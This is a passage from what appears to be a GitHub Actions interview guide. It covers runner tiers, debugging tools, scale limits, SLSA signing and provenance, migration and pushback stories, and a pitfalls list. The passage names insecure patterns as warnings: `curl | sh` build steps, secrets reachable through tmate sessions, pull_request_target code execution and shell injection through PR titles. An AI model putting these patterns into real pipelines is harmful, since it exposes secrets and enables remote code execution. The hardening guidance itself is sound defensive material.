                 │  reusable wf (SHA-pinned) · org rulesets · allowed-actions   │
                 │  policy · OIDC issuer trust · audit-log streaming            │
                 └───────────────┬──────────────────┬─────────────────────────┘
                                 │                  │
                Tier A (high trust / regulated)     Tier B (standard product)
                runner group: isolated, ephemeral   runner group: shared ephemeral
                OIDC roles: prod, env-pinned         OIDC roles: staging/dev
                env: required reviewers + branch pol  env: lighter gates
                evidence: SBOM+provenance+sign+attest evidence: SBOM+sign
```

The trade-offs I'd articulate: **isolation vs cost** — dedicated ephemeral runner groups per tier cost more (idle warm pools, no sharing) but a shared pool risks state bleed and noisy-neighbor starvation; you reserve isolation for the tiers that need it. **Governance vs velocity** — mandatory reusable workflows give one audited place for security logic but risk a platform bottleneck, so you expose enough inputs for the 80% case and a documented escape hatch for the 20%, and you measure adoption + DORA metrics to prove value rather than mandate. **Defense in depth** — no single layer is trusted: read-only default token *and* OIDC claim-scoping *and* environment reviewers *and* admission-time signature verification, so one misconfiguration doesn't compromise the tier. The senior signal is treating this as a *routing + policy + evidence* problem with explicit trust boundaries, and naming what you'd *measure* (adoption %, mean time to patch a vulnerable action across the org, audit-finding rate) to know the platform is working.

#### Q116. [Theory] Explain how `tmate`/SSH debugging, `ACTIONS_STEP_DEBUG`, and the runner's diagnostic logs expose the internal execution model — and the security implications.

The layered debugging surfaces are interesting precisely because each one peels back a different part of the execution model, and an expert understands both what they reveal and why they're dangerous. **`ACTIONS_STEP_DEBUG`** (a secret/variable set to `true`) makes `core.debug()` lines and the runner's verbose step tracing visible — you see exactly how `${{ }}` expressions resolved, what env was set, how inputs were parsed. **Runner diagnostic logs** (`ACTIONS_RUNNER_DEBUG`) go a layer lower, showing the runner agent's own job-plan handling, hook scheduling, and file operations. **Interactive SSH** via a `tmate`-style action opens a live shell *into the runner mid-job*, which is the ultimate "see the actual environment" tool when print-debugging can't reproduce a state-dependent bug.

```
debug surface            reveals                              risk
ACTIONS_STEP_DEBUG       expression resolution, step tracing   debug lines may echo data
ACTIONS_RUNNER_DEBUG     agent internals, hook scheduling      verbose; perf overhead
tmate / SSH session      LIVE shell on the runner             SECRETS reachable in-session
```

The security implications are the senior-level point. A live SSH session runs *inside the job context*, which means **the `GITHUB_TOKEN` and any decrypted secrets are reachable from that shell** — so opening interactive debug on a workflow that has secrets, on a public repo, is an exfiltration risk (anyone who can reach the session, or a malicious "interactive" action, can read them). Mitigations: restrict the tmate session to specific actors (`limit-access-to-actor: true`), only enable it on a branch/run without production secrets, prefer it on a *minimal-permission* re-run, and never leave it as a permanent step. Even `ACTIONS_STEP_DEBUG` carries lower-grade risk because verbose tracing can surface values that wouldn't normally be logged (and masking only catches exact secret strings, not derived ones).

The reason this is a *theory* question and not just "how do I debug": being able to explain that these tools are windows into the runner's plan-execution model — and that the same access that makes them useful (full job context) is what makes them dangerous (full secret access) — demonstrates you understand the runner as a privileged execution environment, not a black box. The disciplined practice is "debug with the least privilege and access scope that still reproduces the problem," mirroring the same least-privilege principle that governs the rest of the platform.

#### Q117. [Behavioral] Tell me about a time you led the migration of a critical pipeline and how you managed the risk to the business.

I'd answer with STAR and emphasize *risk management and stakeholder trust*, since at a senior level the technical migration is table stakes — the judgment is in not breaking the business while you do it. **Situation:** our monolithic release pipeline (the only path to production for the revenue-critical service) ran on aging self-managed CI with frequent flakiness and a single bus-factor owner; leadership wanted it on GitHub Actions but the business could not tolerate a release freeze or a botched deploy. **Task:** migrate without a freeze, without a production incident, and without forcing the team to learn everything at once.

**Action:** I ran it as a **strangler-fig migration, not a big-bang cutover**. First I stood up the new Actions pipeline in *shadow mode* — it built, tested, and produced artifacts on every merge but did **not** deploy, running side-by-side with the old system so we could diff outputs and build confidence with zero production risk. I instrumented both pipelines with the same DORA metrics so I could show leadership objective parity data, not opinions. Then I cut over **one low-risk environment at a time** (dev → staging → prod), keeping the old pipeline as a hot rollback for two full release cycles at each stage, with an explicit, pre-agreed rollback trigger so nobody had to make a judgment call under pressure. I paired with two engineers throughout so the knowledge spread and the bus factor went from one to three. Crucially, I over-communicated: a written migration plan with go/no-go gates, a weekly status to stakeholders, and a clear "here's the blast radius and here's the abort button" framing at each gate.

**Result:** we cut over with zero production incidents and no release freeze; lead time dropped ~30% and flaky-failure reruns fell sharply; the old system was decommissioned a quarter later after it sat idle and proven-redundant. **Reflection:** the lesson I carry is that for critical pipelines, the *sequence and reversibility* of the migration matter more than the destination architecture — shadow-mode parity data converts a scary change into a measured one, and pre-agreed rollback triggers remove the heroics. I now treat "what's the smallest reversible step and how do I prove parity before cutover?" as the first design question of any migration, and "who else can run this when I'm on vacation?" as a completion criterion, not a nice-to-have.

#### Q118. [Theory] At extreme scale, what are the failure modes and limits of GitHub Actions itself, and how do you architect around them?

The expert framing is that Actions is a multi-tenant service with **real, documented limits** that become architectural constraints at scale, and a staff engineer designs *around* them rather than discovering them in an outage. The categories of limit: **concurrency** (a cap on simultaneously-running jobs per account/plan, plus per-org runner-minute and storage budgets), **per-resource caps** (256 jobs per matrix, ~20 unique reusable workflows per run, 4-level nesting, 6-hour job timeout, 35-day max run duration including waits, API rate limits on the `GITHUB_TOKEN`), and **best-effort guarantees** (cron can be dropped/delayed, caches are evictable, queueing has no cross-repo fairness).

```
limit class        example                         architectural response
concurrency        max concurrent jobs / minutes    queue-aware design; self-hosted ARC; spread load
matrix / nesting   256 jobs, 20 reusable, depth 4   shard work; dynamic matrix with bounded size
time               6h job, 35-day run               checkpoint long work; fire-and-poll
API rate           GITHUB_TOKEN secondary limits    batch API calls; backoff; App token w/ higher budget
best-effort        cron drops, cache eviction       idempotent catch-up; durable external state
```

The failure modes that bite at scale: a fan-out that *generates* a matrix can blow past 256 jobs and the run is rejected — so dynamic matrices must be **bounded and sharded**. A reusable-workflow-heavy org can hit the unique-workflow-per-run cap. A job that polls a slow external system can hit the 6-hour wall — the fix is **fire-and-poll** (kick off the work, exit, poll in a separate short job) rather than holding one job open. Heavy API users (bots that touch thousands of PRs) hit the `GITHUB_TOKEN`'s secondary rate limits and must batch + back off, or use an App token with a larger budget. And the *queueing* failure — thousands of jobs landing at once (a monorepo where every push fans out org-wide) — saturates the concurrency cap and stalls *everyone*, which you architect around with affected-only builds (Q60), self-hosted autoscaling pools per team, and load-spreading.

The synthesis an interviewer wants: at small scale Actions feels limitless, but at extreme scale it's a *constrained shared scheduler*, and the durable patterns are (1) **bound and shard** anything that fans out, (2) **decouple long/timed work** from single jobs via fire-and-poll and external schedulers, (3) **make everything idempotent** so best-effort drops self-heal, (4) **isolate and autoscale** runner capacity per tier so one team can't starve another, and (5) **monitor the limits as first-class SLOs** (concurrency saturation, queue depth, API budget) so you see saturation before it becomes an outage. The anti-pattern is treating the platform as infinite and discovering the cap when a release-day fan-out wedges the whole org's CI.

#### Q119. [Theory] How do you design a tamper-evident, end-to-end SLSA supply-chain in Actions, and where can the chain still be broken?

The expert answer treats "supply-chain security" as a *chain of verifiable links from source to running artifact*, then honestly identifies where each link can break. SLSA (Supply-chain Levels for Software Artifacts) frames it as build provenance: an attestation, signed by the build system, stating *what source* and *what build process* produced *which artifact digest*. In Actions the links are: source integrity (signed commits, branch protection, required reviews) → a **hermetic-ish build** on an ephemeral runner → **provenance generation** (`actions/attest-build-provenance` or the SLSA generator, which uses OIDC to sign an in-toto attestation) → **keyless signing** of the image (cosign/Fulcio/Rekor) → **registry storage** of artifact + attestation + signature → **admission-time verification** in the deploy target that re-checks the digest, signature identity, and provenance before running it.

```
source (signed, reviewed)
   │  build on ephemeral runner (OIDC identity)
   ▼
artifact @sha256  ──┬── provenance attestation (in-toto, OIDC-signed) ── Rekor log
                    └── cosign signature (keyless, workflow identity)  ── Rekor log
   │  push to registry (artifact + attestation + signature, by digest)
   ▼
deploy: verify digest + signer identity regex + provenance predicate  ──▶ run
                          (fail closed if any check fails)
```

The breakable links — and why this is a *theory* question — are where the rigor shows. (1) **The build environment is not truly hermetic**: a compromised third-party action or a `curl | sh` step pulls untrusted code *into* the trusted build, so the provenance faithfully attests a poisoned build; SHA-pinning, allowed-actions policy, and dependency pinning narrow this. (2) **Identity, not just signature**: verifying *that* something is signed is worthless without verifying *who* signed it — the `--certificate-identity-regexp` must pin the exact repo+workflow, or an attacker's own signed image passes. (3) **Mutable tags defeat the whole chain** — if you verify `@sha256:...` but deploy `:latest`, you verified one thing and ran another; everything must be digest-bound end to end. (4) **Verification must be enforced at admission**, not just advisory in the pipeline, or someone bypasses CI and pushes straight to the registry/cluster. (5) **Rekor/transparency gives detection, not prevention** — it makes tampering *evident* after the fact, which deters but doesn't block. The senior synthesis: SLSA raises the cost and observability of an attack but is only as strong as its weakest link, so you design *defense in depth* (pinned inputs + signed provenance + identity-scoped verification + admission enforcement + transparency logging) and you name the residual risk (a compromised pinned action, or insider access to the signing identity) rather than claiming the chain is unbreakable.

#### Q120. [Behavioral] Describe a time you had to push back on a request to weaken a pipeline control, and how you handled the organizational dynamics.

I'd use STAR and foreground the *organizational judgment*, because at staff level the hard part isn't knowing the control is right — it's holding the line without becoming the "department of no." **Situation:** during a high-pressure launch, a senior engineering leader asked me to disable the required code-scanning and signature-verification gates on the release pipeline "just for this week" because a flaky scanner was adding ~15 minutes and blocking hotfixes. The pressure was real and the frustration was legitimate — the gate genuinely was slow and occasionally false-positive. **Task:** protect the security posture (these gates were our SOC2 evidence and our defense against shipping a known-vulnerable image) without dismissing a real velocity pain or torching the relationship with a peer leader.

**Action:** I refused the blanket disable but *led with the underlying need, not the policy*. I acknowledged the pain explicitly and committed to fixing the root cause on a deadline. Then I offered concrete alternatives that preserved the control: parallelize the scan so it stopped being on the critical path (cutting ~12 of the 15 minutes), add a *time-boxed, audited, reviewer-approved* break-glass path for genuine emergencies (so the answer to "we have a P0" was "use the documented break-glass with a VP approval and an auto-filed follow-up," not "delete the gate"), and fix the flaky scanner config that weekend. I put the trade-off in *risk* terms the leader cared about — "disabling verification means we could ship an unsigned or vulnerable image during our most-watched launch, and that's exactly when an incident is most expensive" — rather than citing policy. I also escalated transparently: I looped in the security owner so it wasn't my unilateral call and so the leader saw it as a shared organizational decision.

**Result:** we kept the gates on, the parallelization removed most of the latency complaint within a day, the break-glass path gave the team a *safe* fast lane they actually used twice (both auto-audited), and the scanner flakiness was fixed that weekend. The leader later thanked me — the velocity problem was solved without the risk. **Reflection:** the lesson is that "no" lands badly and gets circumvented, but "no, *and here's how we solve your actual problem*" builds trust and keeps the control intact. I now treat every request to weaken a control as a signal that the *secure path is too painful* — the durable fix is almost always to make the secure path faster and to provide a safe, audited escape hatch, not to remove the guardrail. Pushing back well is about separating the legitimate need (speed) from the dangerous proposed solution (no verification), and owning the work to satisfy the need safely.

## ✅ Key Takeaways

- The model is **workflow → jobs (parallel, isolated runners) → steps (sequential, shared filesystem)**; pass data via outputs, artifacts, or cache.
- Prefer **OIDC** over static cloud keys — short-lived, claim-scoped credentials with no secret to rotate or leak. Pin the IAM trust policy `sub` to an exact repo + ref/environment.
- **SHA-pin** third-party actions (not tags) and let Dependabot bump them; mutable tags are a supply-chain attack vector (see the 2025 `tj-actions` incident).
- Set `GITHUB_TOKEN` to **read-only by default** and grant write permissions per-job; the token is repo-scoped and expires at job end.
- Use **matrix** for fan-out, **caching** for regenerable inputs, **artifacts** for outputs, and **concurrency** to cancel stale CI but serialize deploys.
- Standardize org-wide CI/CD with **reusable workflows** (whole jobs) and **composite actions** (step sequences); gate production with **environments + required reviewers**.
- Fork PRs run **without secrets** and a **read-only token** by design — split untrusted CI from privileged CD; avoid `pull_request_target` for code execution.

## ⚠️ Common Pitfalls

- Using `pull_request_target` and then checking out + running the PR's code — classic RCE that leaks secrets.
- Pinning actions to `@v4` or `@main` (mutable) instead of a commit SHA.
- Leaving `GITHUB_TOKEN` at the default broad permissions instead of read-only + per-job grants.
- Interpolating untrusted input (PR titles, branch names) directly into `run:` scripts → shell injection; route through env vars instead.
- Attaching a *persistent* self-hosted runner to a *public* repo (RCE + secret leakage across jobs).
- Wildcard OIDC trust policies (`repo:org/*:*`) that let any workflow assume a privileged role.
- Caching secrets or treating `actions/cache` as durable storage (it's best-effort and evictable).
- Deploying a mutable image tag instead of an immutable digest, so prod runs different bits than were tested.
- `cancel-in-progress: true` on a deploy job, aborting half-finished rollouts.
- Still using deprecated `::set-output`, `actions/upload-artifact@v3`, or `actions/checkout@v1`.

## 📚 Further Reading

- [GitHub Actions Documentation](https://docs.github.com/en/actions) — authoritative reference for syntax, events, and contexts.
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guidance/security-hardening-for-github-actions) — official least-privilege, OIDC, and injection guidance.
- [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect) — OIDC-to-cloud federation deep dive.
- [OpenSSF Scorecard](https://github.com/ossf/scorecard) — automated checks including action-pinning for supply-chain security.
- *Learning GitHub Actions* by Brent Laster (O'Reilly) — end-to-end practical guide.
- [SLSA framework](https://slsa.dev/) — supply-chain provenance levels relevant to signing and attestations.
